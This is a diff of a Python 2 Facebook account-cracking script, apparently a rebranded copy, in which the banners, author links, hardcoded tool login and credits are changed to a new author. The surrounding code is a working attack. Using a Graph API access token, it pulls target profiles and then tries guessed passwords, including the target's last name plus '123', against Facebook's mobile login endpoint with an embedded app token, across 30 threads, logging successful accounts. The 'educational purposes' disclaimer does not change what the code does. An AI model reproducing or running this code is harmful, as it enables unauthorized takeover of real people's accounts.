@@ -296,204 +296,185 @@ logo15 = """
 
 """
 logo16 = """
-\033[1;93m╭━━━╮
-\033[1;93m┃╭━╮┃
-\033[1;93m┃┃╱┃┣━━┳┳━━┳━━┳━╮
-\033[1;93m┃┃╱┃┃╭╮┣┫━━┫┃━┫╭╯
-\033[1;93m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
-\033[1;93m╰━━╮┣╯╰┻┻━━┻━━┻╯
-\033[1;93m╱╱╱╰╯
+\033[1;93m     _      ____    _____   _____   _     
+\033[1;93m    / \    |  _ \  | ____| | ____| | |    
+\033[1;93m   / _ \   | | | | |  _|   |  _|   | |    
+\033[1;93m  / ___ \  | |_| | | |___  | |___  | |___ 
+\033[1;93m /_/   \_\ |____/  |_____| |_____| |_____|
 
-\033[1;91m--> GITHUB :- https://github.com/TechQaiser
+\033[1;91m--> GITHUB :-  https://github.com/Adeel-Khokhar
 
-\033[1;92m--> FACEBOOK :- Qaiser Abbas
+\033[1;92m--> FACEBOOK :- Adeel Khokhar
 
-\033[1;93m--> YOUTUBE :-  Tech Qaiser
+\033[1;93m--> YOUTUBE :-  Aadi Tech
 
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
 
-\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
+\033[1;95m--> NOTE  :- Pray Prayer Five Times daily :-)
 
 """
 logo17 = """
-\033[1;93m╭━━━╮
-\033[1;93m┃╭━╮┃
-\033[1;93m┃┃╱┃┣━━┳┳━━┳━━┳━╮
-\033[1;93m┃┃╱┃┃╭╮┣┫━━┫┃━┫╭╯
-\033[1;93m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
-\033[1;93m╰━━╮┣╯╰┻┻━━┻━━┻╯
-\033[1;93m╱╱╱╰╯
+\033[1;93m     _      ____    _____   _____   _     
+\033[1;93m    / \    |  _ \  | ____| | ____| | |    
+\033[1;93m   / _ \   | | | | |  _|   |  _|   | |    
+\033[1;93m  / ___ \  | |_| | | |___  | |___  | |___ 
+\033[1;93m /_/   \_\ |____/  |_____| |_____| |_____|
 
-\033[1;91m--> GITHUB :- https://github.com/TechQaiser
+\033[1;91m--> GITHUB :-  https://github.com/Adeel-Khokhar
 
-\033[1;92m--> FACEBOOK :- Qaiser Abbas
+\033[1;92m--> FACEBOOK :- Adeel Khokhar
 
-\033[1;93m--> YOUTUBE :-  Tech Qaiser
+\033[1;93m--> YOUTUBE :-  Aadi Tech
 
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
 
-\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
+\033[1;95m--> NOTE  :- Pray Prayer Five Times daily :-)
 
 """
 logo18 = """
-\033[1;93m╭━━━╮
-\033[1;93m┃╭━╮┃
-\033[1;93m┃┃╱┃┣━━┳┳━━┳━━┳━╮
-\033[1;93m┃┃╱┃┃╭╮┣┫━━┫┃━┫╭╯
-\033[1;93m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
-\033[1;93m╰━━╮┣╯╰┻┻━━┻━━┻╯
-\033[1;93m╱╱╱╰╯
+\033[1;93m     _      ____    _____   _____   _     
+\033[1;93m    / \    |  _ \  | ____| | ____| | |    
+\033[1;93m   / _ \   | | | | |  _|   |  _|   | |    
+\033[1;93m  / ___ \  | |_| | | |___  | |___  | |___ 
+\033[1;93m /_/   \_\ |____/  |_____| |_____| |_____|
 
-\033[1;91m--> GITHUB :- https://github.com/TechQaiser
+\033[1;91m--> GITHUB :-  https://github.com/Adeel-Khokhar
 
-\033[1;92m--> FACEBOOK :- Qaiser Abbas
+\033[1;92m--> FACEBOOK :- Adeel Khokhar
 
-\033[1;93m--> YOUTUBE :-  Tech Qaiser
+\033[1;93m--> YOUTUBE :-  Aadi Tech
 
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
 
-\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
+\033[1;95m--> NOTE  :- Pray Prayer Five Times daily :-)
 
 """
 logo19 = """
-\033[1;93m╭━━━╮
-\033[1;93m┃╭━╮┃
-\033[1;93m┃┃╱┃┣━━┳┳━━┳━━┳━╮
-\033[1;93m┃┃╱┃┃╭╮┣┫━━┫┃━┫╭╯
-\033[1;93m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
-\033[1;93m╰━━╮┣╯╰┻┻━━┻━━┻╯
-\033[1;93m╱╱╱╰╯
+\033[1;93m     _      ____    _____   _____   _     
+\033[1;93m    / \    |  _ \  | ____| | ____| | |    
+\033[1;93m   / _ \   | | | | |  _|   |  _|   | |    
+\033[1;93m  / ___ \  | |_| | | |___  | |___  | |___ 
+\033[1;93m /_/   \_\ |____/  |_____| |_____| |_____|
 
-\033[1;91m--> GITHUB :- https://github.com/TechQaiser
+\033[1;91m--> GITHUB :-  https://github.com/Adeel-Khokhar
 
-\033[1;92m--> FACEBOOK :- Qaiser Abbas
+\033[1;92m--> FACEBOOK :- Adeel Khokhar
 
-\033[1;93m--> YOUTUBE :-  Tech Qaiser
+\033[1;93m--> YOUTUBE :-  Aadi Tech
 
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
 
-\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
+\033[1;95m--> NOTE  :- Pray Prayer Five Times daily :-)
 
 """
 logo20 = """
-\033[1;93m╭━━━╮
-\033[1;93m┃╭━╮┃
-\033[1;93m┃┃╱┃┣━━┳┳━━┳━━┳━╮
-\033[1;93m┃┃╱┃┃╭╮┣┫━━┫┃━┫╭╯
-\033[1;93m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
-\033[1;93m╰━━╮┣╯╰┻┻━━┻━━┻╯
-\033[1;93m╱╱╱╰╯
+\033[1;93m     _      ____    _____   _____   _     
+\033[1;93m    / \    |  _ \  | ____| | ____| | |    
+\033[1;93m   / _ \   | | | | |  _|   |  _|   | |    
+\033[1;93m  / ___ \  | |_| | | |___  | |___  | |___ 
+\033[1;93m /_/   \_\ |____/  |_____| |_____| |_____|
 
-\033[1;91m--> GITHUB :- https://github.com/TechQaiser
+\033[1;91m--> GITHUB :-  https://github.com/Adeel-Khokhar
 
-\033[1;92m--> FACEBOOK :- Qaiser Abbas
+\033[1;92m--> FACEBOOK :- Adeel Khokhar
 
-\033[1;93m--> YOUTUBE :-  Tech Qaiser
+\033[1;93m--> YOUTUBE :-  Aadi Tech
 
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
 
-\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
+\033[1;95m--> NOTE  :- Pray Prayer Five Times daily :-)
 
 """
 logo21 = """	
-\033[1;93m╭━━━╮
-\033[1;93m┃╭━╮┃
-\033[1;93m┃┃╱┃┣━━┳┳━━┳━━┳━╮
-\033[1;93m┃┃╱┃┃╭╮┣┫━━┫┃━┫╭╯
-\033[1;93m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
-\033[1;93m╰━━╮┣╯╰┻┻━━┻━━┻╯
-\033[1;93m╱╱╱╰╯
+\033[1;93m     _      ____    _____   _____   _     
+\033[1;93m    / \    |  _ \  | ____| | ____| | |    
+\033[1;93m   / _ \   | | | | |  _|   |  _|   | |    
+\033[1;93m  / ___ \  | |_| | | |___  | |___  | |___ 
+\033[1;93m /_/   \_\ |____/  |_____| |_____| |_____|
 
-\033[1;91m--> GITHUB :- https://github.com/TechQaiser
+\033[1;91m--> GITHUB :-  https://github.com/Adeel-Khokhar
 
-\033[1;92m--> FACEBOOK :- Qaiser Abbas
+\033[1;92m--> FACEBOOK :- Adeel Khokhar
 
-\033[1;93m--> YOUTUBE :-  Tech Qaiser
+\033[1;93m--> YOUTUBE :-  Aadi Tech
 
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
 
-\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
+\033[1;95m--> NOTE  :- Pray Prayer Five Times daily :-)
 
 """
 logo22 = """
-\033[1;93m╭━━━╮
-\033[1;93m┃╭━╮┃
-\033[1;93m┃┃╱┃┣━━┳┳━━┳━━┳━╮
-\033[1;93m┃┃╱┃┃╭╮┣┫━━┫┃━┫╭╯
-\033[1;93m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
-\033[1;93m╰━━╮┣╯╰┻┻━━┻━━┻╯
-\033[1;93m╱╱╱╰╯
+\033[1;93m     _      ____    _____   _____   _     
+\033[1;93m    / \    |  _ \  | ____| | ____| | |    
+\033[1;93m   / _ \   | | | | |  _|   |  _|   | |    
+\033[1;93m  / ___ \  | |_| | | |___  | |___  | |___ 
+\033[1;93m /_/   \_\ |____/  |_____| |_____| |_____|
 
-\033[1;91m--> GITHUB :- https://github.com/TechQaiser
+\033[1;91m--> GITHUB :-  https://github.com/Adeel-Khokhar
 
-\033[1;92m--> FACEBOOK :- Qaiser Abbas
+\033[1;92m--> FACEBOOK :- Adeel Khokhar
 
-\033[1;93m--> YOUTUBE :-  Tech Qaiser
+\033[1;93m--> YOUTUBE :-  Aadi Tech
 
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
 
-\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
+\033[1;95m--> NOTE  :- Pray Prayer Five Times daily :-)
 
 """
 logo23 = """
-\033[1;93m╭━━━╮
-\033[1;93m┃╭━╮┃
-\033[1;93m┃┃╱┃┣━━┳┳━━┳━━┳━╮
-\033[1;93m┃┃╱┃┃╭╮┣┫━━┫┃━┫╭╯
-\033[1;93m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
-\033[1;93m╰━━╮┣╯╰┻┻━━┻━━┻╯
-\033[1;93m╱╱╱╰╯
+\033[1;93m     _      ____    _____   _____   _     
+\033[1;93m    / \    |  _ \  | ____| | ____| | |    
+\033[1;93m   / _ \   | | | | |  _|   |  _|   | |    
+\033[1;93m  / ___ \  | |_| | | |___  | |___  | |___ 
+\033[1;93m /_/   \_\ |____/  |_____| |_____| |_____|
 
-\033[1;91m--> GITHUB :- https://github.com/TechQaiser
+\033[1;91m--> GITHUB :-  https://github.com/Adeel-Khokhar
 
-\033[1;92m--> FACEBOOK :- Qaiser Abbas
+\033[1;92m--> FACEBOOK :- Adeel Khokhar
 
-\033[1;93m--> YOUTUBE :-  Tech Qaiser
+\033[1;93m--> YOUTUBE :-  Aadi Tech
 
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
 
-\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
+\033[1;95m--> NOTE  :- Pray Prayer Five Times daily :-)
 
 """
 logo24 = """
-\033[1;93m╭━━━╮
-\033[1;93m┃╭━╮┃
-\033[1;93m┃┃╱┃┣━━┳┳━━┳━━┳━╮
-\033[1;93m┃┃╱┃┃╭╮┣┫━━┫┃━┫╭╯
-\033[1;93m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
-\033[1;93m╰━━╮┣╯╰┻┻━━┻━━┻╯
-\033[1;93m╱╱╱╰╯
+\033[1;93m     _      ____    _____   _____   _     
+\033[1;93m    / \    |  _ \  | ____| | ____| | |    
+\033[1;93m   / _ \   | | | | |  _|   |  _|   | |    
+\033[1;93m  / ___ \  | |_| | | |___  | |___  | |___ 
+\033[1;93m /_/   \_\ |____/  |_____| |_____| |_____|
 
-\033[1;91m--> GITHUB :- https://github.com/TechQaiser
+\033[1;91m--> GITHUB :-  https://github.com/Adeel-Khokhar
 
-\033[1;92m--> FACEBOOK :- Qaiser Abbas
+\033[1;92m--> FACEBOOK :- Adeel Khokhar
 
-\033[1;93m--> YOUTUBE :-  Tech Qaiser
+\033[1;93m--> YOUTUBE :-  Aadi Tech
 
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
 
-\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
+\033[1;95m--> NOTE  :- Pray Prayer Five Times daily :-)
 
 
 """
 logo25 = """
-\033[1;93m╭━━━╮
-\033[1;93m┃╭━╮┃
-\033[1;93m┃┃╱┃┣━━┳┳━━┳━━┳━╮
-\033[1;93m┃┃╱┃┃╭╮┣┫━━┫┃━┫╭╯
-\033[1;93m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
-\033[1;93m╰━━╮┣╯╰┻┻━━┻━━┻╯
-\033[1;93m╱╱╱╰╯
+\033[1;93m     _      ____    _____   _____   _     
+\033[1;93m    / \    |  _ \  | ____| | ____| | |    
+\033[1;93m   / _ \   | | | | |  _|   |  _|   | |    
+\033[1;93m  / ___ \  | |_| | | |___  | |___  | |___ 
+\033[1;93m /_/   \_\ |____/  |_____| |_____| |_____|
 
-\033[1;91m--> GITHUB :- https://github.com/TechQaiser
 
-\033[1;92m--> FACEBOOK :- Qaiser Abbas
+\033[1;91m--> GITHUB :-  https://github.com/Adeel-Khokhar
 
-\033[1;93m--> YOUTUBE :-  Tech Qaiser
+\033[1;92m--> FACEBOOK :- Adeel Khokhar
+
+\033[1;93m--> YOUTUBE :-  Aadi Tech
 
 \033[1;94m--> DISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
 
-\033[1;95m--> NOTE  :- Need First Hand GirlFriend :-)
+\033[1;95m--> NOTE  :- Pray Prayer Five Times daily :-)
 
 """
 
@@ -552,8 +533,8 @@ print  """
 
 """
 
-CorrectUsername = "Qaiser"
-CorrectPassword = "Lemon"
+CorrectUsername = "HELLOW"
+CorrectPassword = "LADY"
 
 loop = 'true'
 while (loop == 'true'):
@@ -561,15 +542,15 @@ while (loop == 'true'):
     if (username == CorrectUsername):
     	password = raw_input("\033[1;97m\x1b[1;97mTool Password  \x1b[1;97m------- \x1b[1;97m")
         if (password == CorrectPassword):
-            print "Logged in successfully as " + username #Dev:qaiser
+            print "Logged in successfully as " + username #Dev:Aadi
 	    time.sleep(2)
             loop = 'false'
         else:
             print "\033[1;91mWrong Password"
-            os.system('xdg-open https://www.youtube.com/channel/UCHetqAquUkojxVvPebQpb0g')
+            os.system('xdg-open https://www.facebook.con/akyoutuber06')
     else:
         print "\033[1;91mWrong Username"
-        os.system('xdg-open https://www.youtube.com/channel/UCHetqAquUkojxVvPebQpb0g')
+        os.system('xdg-open https://www.facebook.con/akyoutuber06')
 
 ##### LICENSE #####
 #=================#
@@ -796,7 +777,7 @@ def pilih_crack():
 		try:
 			os.mkdir('cookie')
 		except OSError:
-			pass #Dev:qaiser
+			pass #Dev:Aadi
 		try:
 			k = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			y = json.loads(k.text)
@@ -884,7 +865,7 @@ def pilih_crack():
 															cek.close()
 															cekpoint.append(user+pass6)
 														else:
-															pass7 = 'Pakistan1'
+															pass7 = y['lastname'] + '123'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															s = json.load(data)
 															if 'access_token' in s:
@@ -905,21 +886,17 @@ def pilih_crack():
 	p = ThreadPool(30)
 	p.map(main, id)
 	print "▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤▤"
-	print "  Written By Qaiser" #Dev:qaiser
+	print "  Written by Adeel Khokhar" #Dev:qaiser
 	print '\033[1;94mProcess Has Been Completed \033[1;94m....'
-        print '\033[1;92mType (python2 Dvl.py) New Fb Start Cloning\033[1;92m....'
+        print '\033[1;92mType (python2 Lady.py) New Fb Start Cloning\033[1;92m....'
 	print"\033[1;96mTotal Live/\x1b[1;96mCheckpoint \033[1;96m: \033[1;96m"+str(len(oks))+"\033[1;96m/\033[1;96m"+str(len(cekpoint))
 	print """
 
 
-\033[1;96m░░░░░▄▄▀▀▀▀▀▀▀▀▀▄▄░░░░░
-\033[1;96m░░░░█░░░░░░░░░░░░░█░░░░
-\033[1;96m░░░█░░░░░░░░░░▄▄▄░░█░░░
-\033[1;96m░░░█░░▄▄▄░░▄░░███░░█░░░
-\033[1;96m░░░▄█░▄░░░▀▀▀░░░▄░█▄░░░
-\033[1;96m░░░█░░▀█  █  █  █  █▀░░█░░░
-\033[1;96m░░░▄██▄▄▀▀▀▀▀▀▀▄▄██▄░░░
-\033[1;96m░▄█░█▀▀█▀▀▀█▀▀▀█▀▀█░█▄░
+\033[1;96m╔══╗░░░░╔╦╗░░╔═════╗
+\033[1;96m║╚═╬════╬╣╠═╗║░▀░▀░║
+\033[1;96m╠═╗║╔╗╔╗║║║╩╣║╚═══╝║
+\033[1;96m╚══╩╝╚╝╚╩╩╩═╝╚═════╝
 
 
 \033[1;92m ERROR ID AFTER 2 WEEKS (14DAYS)
